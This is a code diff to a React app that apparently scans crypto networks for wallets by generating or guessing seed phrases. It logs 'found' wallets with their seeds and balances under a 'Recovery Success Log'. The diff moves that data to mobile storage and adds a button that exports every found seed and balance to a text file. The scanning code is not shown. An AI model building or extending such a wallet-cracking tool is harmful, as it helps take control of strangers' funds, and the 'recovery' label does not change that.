@@ -34,33 +34,29 @@ const cryptoNetworks = [
   { id: 'op', name: 'Optimism', iconUrl: 'https://cryptologos.cc/logos/optimism-ethereum-op-logo.svg?v=025' },
 ];
 
+import { Storage } from './lib/storage';
+
 export default function App() {
   const [selectedNetworks, setSelectedNetworks] = useState<Set<string>>(new Set(cryptoNetworks.map(n => n.id)));
   const [isScanning, setIsScanning] = useState(false);
   const [checked, setChecked] = useState(0); 
-  const [found, setFound] = useState<any[]>(() => {
-    try {
-      const saved = localStorage.getItem('foundWallets');
-      if (!saved) return [];
-      const parsed = JSON.parse(saved);
-      return Array.isArray(parsed) ? parsed : [];
-    } catch {
-      return [];
-    }
-  });
-  const [totalValue, setTotalValue] = useState(() => {
-    try {
-      const saved = localStorage.getItem('foundWallets');
-      if (saved) {
-        const parsed = JSON.parse(saved);
-        if (Array.isArray(parsed)) {
-          return parsed.reduce((sum: number, b: any) => sum + (b.totalValue || 0), 0);
-        }
-      }
-    } catch {}
-    return 0;
-  }); 
+  const [found, setFound] = useState<any[]>([]);
+  const [totalValue, setTotalValue] = useState(0); 
   const [timeElapsed, setTimeElapsed] = useState(0); 
+
+  // Load initial data from mobile storage
+  useEffect(() => {
+    const loadSavedData = async () => {
+      const savedWallets = await Storage.getFoundWallets();
+      if (savedWallets.length > 0) {
+        setFound(savedWallets);
+        const value = savedWallets.reduce((sum: number, b: any) => sum + (b.totalValue || 0), 0);
+        setTotalValue(value);
+      }
+    };
+    loadSavedData();
+  }, []);
+
   const [rpcStatus, setRpcStatus] = useState<any>(null);
   const [lastCheckTime, setLastCheckTime] = useState<string>('');
   const [recentSeeds, setRecentSeeds] = useState<any[]>([]);
@@ -221,8 +217,11 @@ export default function App() {
     const interval = setInterval(fetchRpcStatus, 30000);
     return () => clearInterval(interval);
   }, [fetchRpcStatus]);
+  // Update storage when found list changes
   useEffect(() => {
-    localStorage.setItem('foundWallets', JSON.stringify(found));
+    if (found.length > 0) {
+      Storage.saveFoundWallets(found);
+    }
     
     // Auto scroll to bottom
     if (foundContainerRef.current) {
@@ -459,7 +458,24 @@ export default function App() {
             <Shield size={14} className="text-[#22c55e]" />
             Recovery Success Log
           </h2>
-          <span className="text-[10px] text-gray-500 font-mono">COUNT: {found.length}</span>
+          <div className="flex items-center gap-3">
+             <button 
+              onClick={() => {
+                 const text = found.map(w => `Timestamp: ${new Date(w.timestamp).toLocaleString()}\nSeed: ${w.seed}\nTotal Value: $${w.totalValue.toFixed(2)}\nBalances: ${Object.entries(w.balances).map(([k, v]: [string, any]) => `${k}: ${v.amount}`).join(', ')}\n------------------`).join('\n\n');
+                 const blob = new Blob([text], { type: 'text/plain' });
+                 const url = URL.createObjectURL(blob);
+                 const a = document.createElement('a');
+                 a.href = url;
+                 a.download = `recovery_log_${Date.now()}.txt`;
+                 a.click();
+              }}
+              disabled={found.length === 0}
+              className="text-[9px] bg-[#22c55e]/10 hover:bg-[#22c55e]/20 text-[#22c55e] border border-[#22c55e]/30 px-2 py-0.5 rounded cursor-pointer disabled:opacity-30 disabled:cursor-not-allowed transition-colors"
+            >
+              EXPORT LOG
+            </button>
+            <span className="text-[10px] text-gray-500 font-mono">COUNT: {found.length}</span>
+          </div>
         </div>
 
         {found.length === 0 ? (
